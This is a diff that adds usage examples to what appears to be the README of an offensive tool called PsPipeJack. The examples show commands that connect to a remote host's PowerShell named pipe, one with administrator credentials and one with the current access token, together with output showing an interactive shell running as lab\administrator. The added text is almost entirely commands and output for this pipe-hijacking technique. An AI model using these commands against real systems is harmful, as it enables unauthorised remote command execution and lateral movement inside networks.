@@ -111,4 +111,24 @@ PSHost.134214327970160016.3492.DefaultAppDomain.powershell
 ### Connect to Remote Pipe (Credentials)
 
 ```
+PsPipeJack.exe --connect 192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell administrator@lab.local 'password'
+[*] Connecting to \\192.168.1.100\pipe\PSHost.134214327970160016.3492.DefaultAppDomain.powershell ...
+[+] Authenticated to \\192.168.1.100\IPC$ as administrator@lab.local
+[+] Connected! Type 'exit' to quit.
+
+PS> whoami
+lab\administrator
+PS>
+```
+
+### Connect to Remote Pipe (Current Access Token)
+
+```
+PsPipeJack.exe --connect 192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell
+[*] Connecting to \\192.168.1.100\pipe\PSHost.134214327970160016.3492.DefaultAppDomain.powershell ...
+[+] Connected! Type 'exit' to quit.
+
+PS> whoami
+lab\administrator
+PS>
 ```
